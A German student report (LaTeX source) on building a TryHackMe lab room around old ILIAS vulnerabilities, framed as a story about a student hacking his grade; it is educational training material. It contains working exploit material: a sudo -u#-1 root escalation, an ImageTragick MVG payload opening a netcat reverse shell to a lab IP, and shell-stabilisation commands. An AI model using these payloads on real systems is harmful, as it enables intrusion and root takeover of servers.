%Preamble
\documentclass[10pt, a4paper,onecolumn ,titlepage]{article}
%\documentclass[man,floatsintext]{apa7}

%Einbindung der Referenzen in das Dokument via BiblaTeX
\usepackage[ngerman]{babel}
\usepackage[style=german,german=quotes]{csquotes}
\usepackage[style=apa,backend=biber]{biblatex}
\DeclareLanguageMapping{american}{american-apa}
\addbibresource{main.bib}

%Packages
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{amsmath,amssymb,amstext}
\usepackage{graphicx}
\usepackage{xstring}
\usepackage{suffix}
\usepackage[nohyperlinks, printonlyused, withpage, smaller]{acronym}
\usepackage{hyperref}
\usepackage{tabularx}
\usepackage{etoolbox}
\usepackage[nooneline]{caption}
\usepackage{float}
\usepackage{pdfpages}
\usepackage{microtype}
\usepackage{booktabs}
\usepackage{abstract}
\usepackage{tablefootnote}
\usepackage{blkarray}
\usepackage{shorttoc}
\usepackage[shortlabels]{enumitem}
\usepackage{threeparttable}
\usepackage{arabicfnt}
\usepackage{tocbibind}

%Ueberschrieben des kewyowrds befehl
\providecommand{\keywords}[1]
{
    \small
    \textbf{\textit{Keywords --}} #1
}

%Zum Einfügen von Code
\usepackage{listings}
\usepackage{color}
\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\lstset{frame=tb,
    language=Bash,
    aboveskip=3mm,
    belowskip=3mm,
    showstringspaces=false,
    columns=flexible,
    basicstyle={\small\ttfamily},
    numbers=none,
    numberstyle=\tiny\color{gray},
    keywordstyle=\color{blue},
    commentstyle=\color{dkgreen},
    stringstyle=\color{mauve},
    breaklines=true,
    breakatwhitespace=true,
    tabsize=2
    numbers=left
}


%Document
\begin{document}

%Titelseite
    \begin{titlepage}
        \begin{center}

            \vspace*{1cm}

            {\large \textbf{Entwicklung eines TryHackMe Raumes}}

            \vspace{0.5cm}
            zur Sicherheitsschulung von Schwachstellen - aufgezeigt am Lernmanagementsystem ILIAS

            \vspace{1.5cm}

            \textbf{Chris Benz} \\
            \small{chbenz@stud.hs-heilbronn.de}
            \\
            \vspace{0.2cm}
            \textbf{Umut Mehmet Eke}\\
            \small{ueke@stud.hs-heilbronn.de}
            \\
            \vspace{0.2cm}
            \textbf{Lennart Kremp} \\
            \small{lkremp@stud.hs-heilbronn.de}
            \\
            \vspace{0.2cm}
            \textbf{Frederik Spieß}\\
            \small{frspiess@stud.hs-heilbronn.de}


            \vfill

            \begin{figure}[H]
                \centering
                \begin{minipage}[b]{.13\linewidth} % [b] => Ausrichtung an \caption
                    \includegraphics[width=\linewidth]{author_pictures/chris_2}
                \end{minipage}\label{fig:chris}
                \hspace{.005\linewidth}% Abstand zwischen Bilder
                \begin{minipage}[b]{.13\linewidth} % [b] => Ausrichtung an \caption
                    \includegraphics[width=\linewidth]{author_pictures/umut}
                \end{minipage}\label{fig:umut}
                \hspace{.005\linewidth}% Abstand zwischen Bilder
                \begin{minipage}[b]{.13\linewidth} % [b] => Ausrichtung an \caption
                    \includegraphics[width=\linewidth]{author_pictures/chris_2}
                \end{minipage}\label{fig:lennart}
                \hspace{.005\linewidth}% Abstand zwischen Bilder
                \begin{minipage}[b]{.13\linewidth} % [b] => Ausrichtung an \caption
                    \includegraphics[width=\linewidth]{author_pictures/chris_2}
                \end{minipage}\label{fig:frederik}
            \end{figure}


            \vfill

            Durchführung im Rahmen der Veranstaltung \\ \glqq Praktikum sichere Software-Entwicklung\grqq\ an der Hochschule Heilbronn

            \vspace{0.2cm}

            Beaufsichtigt durch Prof. Dr.-Ing. Andreas Mayer

            \vspace{1.0cm}


            \vspace{0.8cm}

            Fakultät für Informatik\\
            Hochschule Heilbronn\\
            \today{}, Heilbronn

        \end{center}

    \end{titlepage}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	Abstract
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

    \renewcommand*\abstractname{\flushleft\textbf{Abstract}\hfill}
    \begin{abstract}
        \hline
        \vspace{0.5cm}
        \noindent
        \textbf{Hintergrund}:  In einer immer stärker miteinander vernetzten Welt wird eines immer wichtiger, die Sicherheit und der Schutz digitaler Infrastruktur.
        Dies zeigt auch eine immer weiter zunehmenden Anzahl an Cyberangriffen, die es nötig macht, seine IT-Infrastruktur immer im Blick zu behalten und bestmöglich vor ungewollten Angriffen zu schützen.
        Geschultes IT-Personal mit fundierten Kenntnissen im Umgang mit Schwachstelle ist somit unerlässlich.

        \vspace{0.5cm}
        \noindent
        \textbf{Zielsetzung}: Das Ziel dieses Projekts ist das Erstellen eines TryHackMe Raumes, der anhand einer ansprechenden Storyline
        Wissen im Bereich IT-Sicherheit vermittelt und vorhandene Kenntnisse auf die Probe stellt.
        Es gilt demnach, geeignete Schwachstellen (in ILIAS) zu bestimmen und eine Storyline rund um diese zu entwerfen.
        Passende Technologien sind auszuwählen und die \ac{vm}, zur späteren Einbindung in den TryHackMe Raum, auszuarbeiten.
        Abschließen gilt es alle Komponenten in einem ansprechend designten TryHackMe Raum zu vereinen.


        \vspace{0.5cm}
        \noindent
        \textbf{Ergebnisse}: Insgesamt wurden zwei \ac{vm}s mit den Ilias Versionen 5.2.3 und 5.2.4 erstellt.
        Eine Storyline rund um den Studenten TimDerHackerBoy führt die Nutzer des Raumes durch die beiden Maschinen.
        Um den Raum erfolgreich abzuschließen sind unter anderem verschiedene Schwachstellen auszunutzen, drei Flags zu finden und den erfolgreichen Umgang mit verschiedenen Tools wie Hydra unter Beweis zustellen.

        \vspace{0.5cm}
        \hline
        \vspace{5cm}
        \noindent
        \keywords{Ilias, Fehlkonfiguration, ImageMagick, Privilage Escalation, XSS}

        \vspace{3cm}
        \noindent
        Für Zugang zum Git-Repository oder bei Fragen und Anregungen melden Sie sich bitte untern den angegebene Mail-Adressen der Autorenschaft.
    \end{abstract}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	1.Inhaltsverzeichnis
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


%    \shorttoc{Inhaltsübersicht}{1} %Inhaltübersicht ohne Unterpunkte
%    \pagebreak
     \tableofcontents
     \vfill
     \pagebreak


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	1.Einleitung
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \fill
    \newpage
    \section{Einleitung}
    \label{sec:einleitung}

    \subsection{Gegenstand und Motivation}
    \label{subsec:gegenstand-motivation}
    \footnote{In dieser Arbeit wird aus Gründen der besseren Lesbarkeit das generische Maskulinum verwendet. Weibliche und anderweitige Geschlechteridentitäten werden dabei ausdrücklich mitgemeint.}
    Die Zuverlässigkeit moderner IT-Systeme entscheidet über Erfolg oder Misserfolg vieler Firmen, Branchen oder ganzer Nationen.
    Betroffen sind aber nicht nur große Organisationen, jeder Einzelne kann zum Opfer werden mit schwerwiegenden Folgen.
    Deshalb wird eines in unserer immer stärker miteinander vernetzten Welt immer wichtiger, die Sicherheit und der Schutz digitaler Infrastruktur.
    Dies zeigt auch eine immer weiter zunehmenden Anzahl an Cyberangriffen, die es nötig macht, seine IT-Infrastruktur immer im Blick zu behalten und bestmöglich vor ungewollten Angriffen zu schützen.
    Geschultes IT-Personal mit fundiertenKenntnissen im Umgang mit Schwachstelle ist somit unerlässlich.
    Eine Möglichkeit ein solches Wissen zu erlangen, bietet die Lernplattform \href{https://tryhackme.com/}{TryHackMe}.
    Sie bietet interessierten Personen die Möglichkeit sich in Lern- und Challengeräumen umfangreiches Wissen im Bereich Ethical Hacking anzueignen.
    Und das erworbene Wissen in einer realitätsnahen, aber dennoch abgesicherten Umgebung zu testen.
    Jüngst sind auch viele Hochschulen und Universitäten Ziel von Cyberangriffen geworden, oftmals mit dem Ziel Geld zu erpressen~\parencite{hhnGehackt}.
    Eine häufig zur Kommunikation genutzte Software an Universitäten und Hochschualen ist das Lernmanagementsystem ILIAS, das in der Vergangenheit ebenfalls verschiedene Schwachstellen aufwies, die ein Einfallstor für Hacker darstellten.
    Um eine möglichst realistische Lernumgebung des zu entwickelnden TryHackMe Raumes zu schaffen, greift der zu entwickelnde TryHackMe Raum auf eben diese ILIAS Schwachstellen zurück.


    \subsection{Zielsetzung}
    \label{subsec:zielsetzung}
    Das oberste Ziel des zu TryHackMe Raumes besteht in der Wissensvermittlung bzw. dem Prüfen erworbener Kenntnisse.
    Indem wir interessierte Personen mittels einer Storyline durch einen mit realistischen und in der Vergangenheit aufgetretener Schwachstellen leiten, sollen diese ihr Können unter Beweis stellen.
    Dies soll das Verständnis für die Bedeutung der IT-Sicherheit in der heutigen digitalen Landschaft fördern und gleichzeitig zukünftige Sicherheitsexperten bestmöglich auf Bedrohungen einstellen.
    Die Geschichte handelt von einem jungen Studenten namens TimDerHackerboy, der sich im Laufe seines Kurses \glqq Grundlagen der sicheren Software-Entwicklung\grqq\ zu einer besseren Note hackt.
    Dabei begegnet er unter anderem Schwachstellen wie dem \ac{xss}, ImageTragick oder einer Fehlkonfiguration, die bei geschicktem Ausnutzen eine Privilege Escalation zulässt.
    Es gilt demnach, geeignete Schwachstellen zu bestimmen und diese in die Storyline rund um TimDenHackerboy einzuarbeiten.
    Passende Technologien sind auszuwählen und die \ac{vm}en, zur späteren Einbindung in den TryHackMe Raum, auszuarbeiten.
    Abschließend gilt es, alle Komponenten in einem ansprechend designten TryHackMe Raum zu vereinen.




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	2.Grundlagen
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \fill
    \newpage
    \section{Grundlagen}
    \label{sec:grundlagen}

    \subsection{ILIAS}
    \label{subsec:ilias}
    Die Abkürzung ILIAS beschreibt ein \ac{ilias} .
    Bei der Software handelt es sich nicht um eine Lernplattform, sondern um ein System mit dem sich eine solche betreiben lässt.
    Die Software fällt unter die Kategorie Open-Source und ist somit für jedermann zugänglich und wird seit dem Jahre 2000, aufgrund großen Interesses, unter der GNU General Public Licence veröffentlicht.
    Mittlerweile erscheint \ac{ilias} in der achten Version und ermöglicht Lehrenden und Lernenden eine möglichst unkomplizierte Kommunikation.
    \ac{ilias} ist wie eine Bibliothek zu verstehen, die es ermöglicht Wissen in Kursen möglichst einfach bereitzustellen und zu managen.
    Mittlerweile wurde diese Kernkompetenz zudem durch Module zur Kommunikation oder auch dem Durchführen von Onlineprüfungen ergänzt.
    Nutzer sind mittlerweile nicht nur Hochschulen und Universitäten, sondern auch Akademien, die NATO und die Bayerische Polizei~\parencite{ilias}.

    \subsection{Cross-Site-Scripting}
    \label{subsec:CrossSiteScripting}
    Bei \ac{xss} handelt es sich um eine weit verbreitete Schwachstelle, die zudem von der \ac{owasp} geführt wird.
    XSS-Angriffe sind eine Art von Injektion, bei der bösartige Skripte in ansonsten gutartige und vertrauenswürdige Websites eingeschleust werden.
    XSS-Angriffe treten auf, wenn ein Angreifer eine Webanwendung nutzt, um bösartigen Code, in der Regel in Form eines browserseitigen Skripts, an einen anderen Endbenutzer zu senden~\parencite{xss}.
    Eine Ursache für das Auftreten von XSS-Schwachstellen ist das Vertrauen in den Nutzer oder schlichtweg eine nicht vorhandene Validierung der Nutzereingaben.
    Angreifer mit unethischen Absichten erhalten so einen Weg, der es ihnen erlaubt, schädliche Skripte auszuführen und so vertrauliche Informationen zu erlangen.
    Je nach Schwachstelle kann es sich dabei beispielsweise um Session-Cookies oder Zugangsdaten handeln.
    Zudem findet eine Einteilung in zwei Arten von XSS-Angriffen statt:
    \\
    (1) \textbf{Reflected \ac{xss} Attacken} beschreiben eine Attacke, bei der das \ac{xss} Skript vom Webserver reflektiert wird.
    Dies kann unter anderem in Form einer Fehlermeldung oder Suchergebnissen der Fall sein.
    \\
    (2) \textbf{Stored \ac{xss} Attacken} hingegen beschreiben eine Attacke, bei der das \ac{xss} Skript eingeschleust und anschließend auf dem verwundbaren Zielserver gespeichert wird.
    Dies ermöglicht ein Ausführen des schädliche \ac{xss} Skripts, nach jedem Aufruf des Zielservers durch unbedarfte Nutzer.
    Beliebte Beispiele zum Platzieren eines solchen \ac{xss} Skripts sind Forenbeiträge, Kommentare oder Datenbankeinträge.


    \subsubsection{CVE-2018-5688}
    \label{subsubsec:CVE-2018-5688}
    Die Schwachstelle \href{https://www.cve.org/CVERecord?id=CVE-2018-5688}{CVE-2018-5688} tritt in ILIAS Versionen vor 5.2.4 auf.
    Durch Ausnutzung dieser Schwachstelle kann schädlicher \ac{xss} Skriptcode eingeschleust und ausgeführt werden, was potenziell zu Sicherheitsproblemen führen kann.
    Diese Schwachstelle betrifft den cmd-Parameter der displayHeader-Funktion womit .php Dateien in der Setup-Komponente der Ilias-Software ausgelesen werden können~\parencite{xssExploitDb}.
    Zum Ausnutzen der Schwachstelle muss ein Angreifer nicht eingeloggt sein.
    Mit einer CVSS Bewertung von 4.3 ist die Schwachstelle nicht als extrem gefährlich eingestuft, was daran liegt, dass die möglichen Auswirkungen auf das System moderat sind~\parencite{xssCVEDetails}.

    \subsection{ImageMagick}
    \label{subsec:ImageMagick}
    \href{https://imagemagick.org}{ImageMagick} ist eine weitverbreitete Open-Source-Software zur Anzeige, Konvertierung und Bearbeitung von Bilddateien.
    Es wird ein command-line Interface, sowie APIs für die Integration in eigene Softwareprojekte bereitgestellt.
    Die Software bietet dabei einen großen Umfang an Funktionen und unterstützt eine Vielzahl an gängigen Dateiformaten, weshalb sie eine große Nutzerschaft in Bereichen wie der Webentwicklung, wissenschaftlichen Forschung, medizinischen Bildgebung und vielen weiteren aufweisen kann.
    Eine der wichtigsten Funktionen, die ImageMagick zu bieten hat, ist das Verarbeiten von Skripten und die Möglichkeit zur Automatisierung.
    Immer gleich Abläufe für eine Großzahl an Bildern können so vereinfacht werde, weshalb die Software auch in Ilias eingesetzt wird~\parencite{imagemagick}.


    \subsubsection{CVE-2016-3714 (ImageTragick)}
    \label{subsubsec:CVE-2016-3714}
    Die Schwachstelle \href{https://www.cvedetails.com/cve/CVE-2016-3714/}{CVE-2016-3714}, auch \glqq ImageTragick\grqq\ genannt, tritt in den Versionen 6.9.3-10 und 7.x vor 7.0.1-1 von ImageMagick auf.
    Die Sicherheitslücke ist im Jahre 2016 erstmal entdeckt worden und betrifft die Verarbeitung von Bilddateien mit der ImageMagick Software-Bibliothek.
    Durch \glqq ImageTragick\grqq\ ist es möglich, Schadcode in Form einer Bilddatei in ein System einzuschleusen und anschließend serverseitig auszuführen.
    Da es sich bei ImageMagick um eine Software-Bibliothek handelt, die wie in~\ref{subsec:ImageMagick} bereits erwähnt eine große Nutzerzahl aufweist, war die Schwachstelle zum Zeitpunkt ihrer Entdeckung durch die Sicherheitsfirma Check Point in einer Vielzahl von Softwareprodukten zu finden~\parencite{imageTragicReport}.
    ILIAS verwendet ImageMagic zur Verarbeitung der Profilbilder ihrer Nutzer, weshalb auch ILIAS je nach verwendeter ImageMagick Version von der Sicherheitslücke betroffen war.

    \subsection{Privilege Escalation}
    \label{subsec:PrivilegeEscalation}
    Von Privilege Escalation, zu Deutsch Rechteausweitung, spricht man immer dann, wenn ein vermeintlicher User durch Ausnutzen einer Sicherheitslücke zu mehr Rechten kommt als eigentlich für diesen vorgesehen.
    Ziel ist es, Zugriff auf Ressourcen oder Bereiche eines Systems zu erhalten, zu denen normalerweise kein Zugang besteht.
    Eine solche Schwachstelle stellt ein ernstes Sicherheitsrisiko dar, da sie einem Angreifer im schlimmsten Falle umfangreiche Kontrolle über das System ermöglicht.
    Grundsätzliche sind zwei Arten der Privilege Escalation zu unterscheiden:
    \\
    (1) Von einer \textbf{horizontalen Privilege Escalation} ist immer dann die Rede, wenn sich ein Nutzer Zugang zu einer gleichwertigen Sicherheitsebene eines anderen Nutzers verschafft.
    \\
    (2) Von einer \textbf{vertikalen Privilege Escalation} hingegen ist immer dann die Rede, wenn ein Nutzer sich Zugang zu einer höheren Sicherheitsebene als der ihm zugewiesenen verschafft\parencite{privilegeEscalationArten}.
    Die Ursachen für Privilege Escalation können vielfältiger Natur sein, oftmals sind sie jedoch auf technische Schwachstellen oder menschliches Fehlverhalten zurückzuführen, wie ein bereits bestehender \href{https://tryhackme.com/room/linprivesc}{TryHackMe Raum} zeigt.
    Gegenmaßnahmen liegen in der Hand der Administratoren eines Systems, sie sollten auf die Einhaltung gängiger Sicherheitspraktiken, dem Einspielen aktueller Updates, einer starken Zugriffskontrolle sowie einer gut kontrollierten Berechtigungsverwaltung achten.


    \subsubsection{CVE-2019-14287 (Sudo)}
    \label{subsubsec:sudo}
    Bei Sudo handelt es sich um ein Kommandozeilenprogramm für Unix Systeme, wie auch das von uns eingesetzte Betriebssystem Linux.
    Es bietet die Möglichkeit Benutzern gewisse Rechte zuzuordnen.
    Diese sind somit in der Lage, Befehle auszuführen, für die es normalerweise die erhöhten Rechte eines anderen Nutzer notwendig sind.
    Die Schwachstelle \href{https://www.cvedetails.com/cve/CVE-2019-14287/?q=CVE-2019-14287}{CVE-2019-14287} tritt in Sudo Versionen vor 1.28 auf.
    Sudo wird dazu mit der manipulierten Nutzer-ID -1 oder 4294967295 wie folgt aufgerufen: sudo -u\#-1 /bin/bash.
    Einem Angreifer ist es bei einer bestimmten sudoers Konfiguration (die den root Zugriff ausführlich verbietet) möglich, Befehle mit root Rechten auszuführen wie ein Exploit von \textcite{privilegeEscalationSudoExploit} zeigt:
    \vspace{0.5cm}
    \begin{lstlisting}[label={lst:examplesudo}]
        #User hacker sudo privilege in /etc/sudoers
        #User privilege specification
        root   ALL=(ALL:ALL) ALL
        hacker ALL=(ALL,!root) /bin/bash
        #Example
        hacker@kali:~$ sudo -u#-1 /bin/bash
        root@kali:/home/hacker# id
        uid=0(root) gid=1000(hacker) groups=1000(hacker)
    \end{lstlisting}
    \vspace{0.5}
    Mit einer CVSS Bewertung von 9.0 ist sie als besonders gefährlich eingestuft~\parencite{privilegeEscalationSudo}.
    Ein Ausnutzen der Schwachstelle durch einen Angreifer kann fatale Auswirkungen auf das betroffene System haben.



    \subsubsection{Fehlkonfiguration (/etc/pssswd)}
    \label{subsubsec:fehlkonfiguration}
    Die /etc/passwd Datei in Linux Systeme ist als eine Art Nutzerdatenbank zu verstehen.
    Sie enthält Informationen zu den Systemnutzern, dazu gehören Nutzer-ID, Gruppen-ID, Shell-Zuordnung und früher ebenso Passwörter.
    Bei der Datei handelt es sich meistens um eine .txt Datei, die immer für alle Nutzer lesbar ist~\parencite{privilegeEscalationPasswd}.
    In der \ac{vm}2 werden die Zugriffsrechte für die /etc/passwd Datei unter Verwendung des Befehls chmod 777 geändert.
    Der chmod Befehl wird in Linux dazu verwendet, die Zugriffsrechte auf Dateien und Verzeichnisse zu ändern.
    Die hinterlegten Zugriffsrechte für die passwd Datei sehen nunmehr wie folgt aus: rwxrwxrwx.
    Dementsprechend ist es jedem Nutzer des Systems gestatte, die Datei zu lesen/read, schreiben/write und auszuführen/execute~\parencite{privilegeEscalationFehlkRechte}.
    Eine solche Fehlkonfiguration führt zu schwerwiegenden Sicherheitsproblemen für das System.
    Angreifer sind so in der Lage auf Nutzerinformationen zuzugreifen, sich eigene Nutzer mit root Rechten anzulegen und so selber root zu werden.
    Eine solche Fehlkonfiguration sollte unter allen Umständen vermieden werden und dient in der \ac{vm}2 lediglich der Veranschaulichung welche Folgen eine solche für ein System haben kann.








%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	3. Technologien / Methoden und Werkzeuge
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \fill
    \newpage

    \section{Technologien}
    \label{sec:technologien}

    \subsection{Docker}
    \label{subsec:docker}
    Docker ist eine Open-Source-Plattform, die es Entwicklern ermöglicht, Anwendungen in Containern zu erstellen, zu verpacken und auszuführen.\n 
    Container sind eigenständige und isolierte Einheiten, die alle erforderlichen Abhängigkeiten enthalten, um Anwendungen auf verschiedenen Systemen konsistent auszuführen.\autocite{docker}
    \n Theoretisch stellt der User \glqq sturai\grqq\ ein ILIAS-Image über Docker Hub bereit (\href{https://hub.docker.com/r/sturai/ilias#!}{s. hier}).
    Jedoch konnten wir dieses nicht benutzen, da die angebotenen Versionen unsere Exploits nicht mehr unterstützen beziehungsweise diese darin behoben sind.\n
    Unsere Lösung
    \subsection{VM mit einem Ubuntu Betriebssystem}
    \label{subsec:ubuntu}

    \subsection{MySQL Datenbank}
    \label{subsec:mysqlDatenbank}

    \subsection{Apache Server mit einem Debian Betriebssystem}
    \label{subsec:apacherServer}

    \subsection{ILIAS mit ImageMagick}
    \label{subsec:iliasTechnologie}


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%	4. Storyline und Musterlösung
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
    \fill
    \newpage

    \section{Storyline und Musterlösung}
    \label{sec:storyline}
    Hier geht es zum \href{https://tryhackme.com/jr/t1mth3h4ck3rb0y}{\textbf{TryHackMe Raum}}.\vspace{0.5cm}
    \\
    Die Storyline dreht sich rund um den jungen Studenten TimDerHackerboy.
    Dieser besucht im aktuellen Semester den Kurs \glqq Grundlagen der sicheren Software-Entwicklung\grqq, in dem den Studenten die Grundlagen in Bezug auf Schwachstellen und sichere Software vermittelt werden.
    Für TimDerHackerboy nichts allzu Neues, da er sich auch außerhalb seines Informatikstudiums oft mit Sicherheitslücken in allerhand Software beschäftigt und die OWASP TOP 10 für ihn ein Kinderspiel sind.
    Er konnte sogar schon erste Erfahrung als Berater für ein paar renommierte Firmen aus der Umgebung machen.
    Und eines sollte gesagt sein, in Heilbronn sind ein paar der renommiertesten Firmen Deutschlands ansässig.
    Genau deshalb hat TimDerHackerboy sein Studium die letzten Wochen aber auch schleifen lassen, die Praxis und das Geld waren einfach zu verlockend.
    All das weiß Professor SuperSicherAndi nicht, sein Student Tim ist schließlich nie zu den Vorlesungen erschienen und auch sonst glänzte er nicht gerade mit außerordentlichem Fleiß.
    Hier steht TimDerHackerboy also, die letzte Woche der Vorlesungszeit ist angebrochen und er hat noch nichts gemacht.
    Professor SuperSicherAndi hat die Studenten dazu verdonnert, ganze 35 TryHackMe Räume zu machen.
    Und als wäre das nicht genug, soll TimDerHackerboy auch noch einen eigenen TryHackMe Raum einwickeln und eine Ausarbeitung darüber schreiben.
    Ein Berg an Arbeit, der kaum zu bewältigen ist, Professor SuperSicherAndi wird ihn höchstwahrscheinlich durchfallen lassen.
    Doch Tim würde nicht den Spitznamen Hackerboy tragen, wenn er nicht eine bessere Idee hätte.
    Warum nicht einfach ILIAS hacken und sicher selber eine eins geben.
    Aus Gesprächen weiß er, viele Professoren verwaltete ihre Noten direkt in ILIAS, es sei schließlich sicher.
    TimDerHackerboy wird dabei durch zwei verschiedene \ac{vm}s geleitet.
    \ac{vm}1 ist mit der ILIAS Version 5.2.3 ausgestattet, welche für die in~\ref{subsubsec:CVE-2018-5688} erklärte XXS Schwachstelle anfällig ist.
    Für Tim gilt es hier sich Zugang zum Account des Professors SuperSicherAndi zu verschaffen und seine Note zu ändern, was ihm seine erste Flag einbringt.
    Im weiteren Verlauf gilt es seine Spuren nach einem erfolgreichen Brute-Forcen des SSH Logins zu beseitigen, er will schließlich nicht das der Professor ihm auf die Schliche kommt.
    Hiermit sichert er sich die zweite Flag und hat die \ac{vm}1 erfolgreich abgeschlossen.
    In \ac{vm}2 läuft die ILIAS Version 5.2.4 in Verbindung mit der ImageMagick Version 6.3.9-8 (\ref{subsubsec:CVE-2016-3714}).
    Mittels eines Exploits gilt es für Tim, sich Zugang zum Server mittels einer Reverse Shell zu verschaffen.
    Dort erwarten ihn eine falsch konfigurierte /etc/passwd Datei (\ref{subsubsec:fehlkonfiguration}) und ein anfällige Sudo Version (\ref{subsubsec:sudo}).
    Am Ende steht die Tim der Königsdisziplin entgegen, der Privilege Escalation.
    Meister er diese unter Verwendung der fehlerhaft konfigurierten Datei oder der Sudo Schwachstelle, findet er als root Nutzer seine letzte Flag.
    Ob Professor SuperSicherAndi TimDenHackerboy schlussendlich erwischt, das zeigt am Ende die Notenvergabe.
    Eines hat Tim aber bewiesen, sein Können im Bereich IT-Sicherheit.



    \subsection{Virtuelle Maschine 1}
    \label{subsec:vm1}

    \subsection{Virtuelle Maschine 2}
    \label{subsec:vm2}
    Nachdem TimDerHackerboy sicher erfolgreich durch die \ac{vm}1 gekämpft hat und sogar Credentials für neue ILIAS Version 5.2.3 in die Finger bekam, wird es Zeit für eine neue Aufgabe.
    Die neue ILIAS Version wird durch Administratoren der Hochschule gerade neu aufgesetzt und ist noch nicht für die Studenten zugänglich.
    Die Verantwortlichen der Hochschule, zu denen auch der Professor SuperSicherAndi zählt, entschieden sich so die bekannte XSS Schachstelle aus Version 5.2.3 zu beheben.
    Doch Tims Nachname wäre nicht Hackerboy, würde er sich nicht direkt an die Arbeit machen und den Administratoren zeigen, dass sie ihre Arbeit nicht richtig machen.
    So könnte er Professor SuperSicherAndi sicher überzeugen, dass er die eins auf jeden Fall verdient hat, sollte dieser ihm trotz aller Vorsichtsmaßnahmen auf die Schliche kommen.

    \subsubsection{ImageMagick Schwachstelle finden und Payload erstellen}
    \label{subsubsec:imageMagickFinden}

    \begin{figure}[H]
        \centering
        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/loginAlsDev01}
        \caption{Login mit den in~\ref{subsec:vm1} erworben Credentials \textit{tempdev01} und \textit{qLEaZ6P@3#}}
        \label{fig:loginAlsDev}
    \end{figure}
    
    Komplett vertieft will Tim sich direkt mit den Credentials einloggen.
    Als er die Login-Seite kurz überfliegt, fallen ihm die Wort \textit{using ImageMagic(v6.9.3-8)} direkt auf.
    \begin{figure}[H]
        \centering
        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/loginPageHinweisImageMagick}
        \caption{Login Page ILIAS zeigt Hinweis auf eingebundene ImageMagick Version}
        \label{fig:loginPageHinweis}
    \end{figure}

    \noindent
    Er hatte vor kurzem etwas über ImageTragic gelesen.
    Und wie so oft, bietet \href{https://www.exploit-db.com/exploits/39767}{\textbf{exlpoit-db}} direkt die richtigen Informationen.

    \vspace{0.4cm}
    \begin{lstlisting}[label={lst:imageMagickExploit}]
        exploit.mvg
        -=-=-=-=-=-=-=-=-
        push graphic-context
        viewbox 0 0 640 480
        fill 'url(https://example.com/image.jpg"|ls "-la)'
        pop graphic-context
    \end{lstlisting}~\parencite{imagemagickExploit}
    \vspace{0.3cm}
    \\
    Dieser Exlpoit zeigt nach dem Ausführen eine Liste aller Dateien und Verzeichnisse im aktuellen Verzeichnis als Profilbild an.
    Das ist Tim jedoch nicht genug, er möchte eine Reverse Shell.
    Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc Ziel-IP Port –e /bin/bash}.
    Es gilt abschließend den in~\ref{lst:imageMagickExploit} beschriebene Exploit um die Netcat Reverse Shell ergänzen.
    Das der Exploit ausgeführt wird, ist darauf zurückzuführen, dass ImageMagick versucht das Dateiformat anhand des Inhalts festzustellen.
    \vspace{0.4cm}
    \begin{lstlisting}[label={lst:imageMagickExploitFinal}]
        #Als .txt bearbeiten und in einem akzeptiertem Dateiformat speichern
        #Lokale IP und Zielport tauschen
        push graphic-context
        viewbox 0 0 640 480
        fill 'url(https://example.com/image.jpg"|nc 10.101.0.137 4444 "-e/bin/bash '
        pop graphic-context
    \end{lstlisting}
    \vspace{0.3cm}

    \subsubsection{Verbindung mittels Reverse Shell herstellen und stabilisieren}
    \label{subsubsec:verbindunHerstellen}
    Im nächsten Schritt gilt es mittels dem in~\ref{subsubsec:imageMagickFinden} erstellten Exploit eine Verbindung zum Server herzustellen.
    Dazu muss Tim einen Netcat Listener erstellen, der den durch den Exploit angestoßenen Verbindungsversuch entgegennimmt.
    Das kann mittels des nc Befehls wie folgt erreicht werden: \textit{nc -lvnp zielIP zielport}.
    Wird nun der Exploit als Profilbild gespeichert,
    \begin{figure}[H]
        \centering
        \includegraphics[width=1\textwidth]{storyline_bilder_vm2/VerbindungDa}
        \caption{Der Exploit wird als Profilbild gespeichert und ein Netcat Lister nimmt den Verbindungsversuch des Servers auf Port 444 entgegen.}
        \label{fig:exploitHochladen}
    \end{figure}
    \noindent
    Nach, dem die Verbindung erfolgreich etabliert ist, kommt schon das nächste Problem auf Tim zu.
    Die Bash Shell ist zu instabil um damit fortzufahren.
    Um die Shell zu stabilisieren, beschreibt ~\textcite{shellStabilisieren} folgendes Vorgehen:

    \begin{enumerate}[leftmargin=2.5cm]
        \item[1.] \textit{python -c 'import pty; pty.spawn("/bin/bash")'}  in der Konsole eingeben.
